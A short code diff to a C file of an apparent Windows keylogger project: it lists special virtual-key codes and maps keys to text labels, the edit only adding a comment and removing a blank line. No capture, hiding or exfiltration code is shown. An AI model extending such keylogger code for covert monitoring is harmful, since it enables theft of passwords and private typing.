@@ -1,6 +1,5 @@
 #include "keyLogger.h"
 
-
 /* A collection of the supported characters other than letters or numbers */
 key_t specialKeys[] = {
     VK_BACK, VK_TAB, VK_SHIFT, VK_MENU, VK_CAPITAL, VK_PAUSE, VK_SPACE, VK_CONTROL, VK_RETURN
@@ -60,6 +59,7 @@ void getKeyContext(const key_t key, char *context)
         strContext = "[SPACE]";
         break;
     default:
+        // for unsupported keys
         strContext = "[OTHER]";
     }
     strcpy_s(context, MAX_KEY_CONTEXT_LEN, strContext);
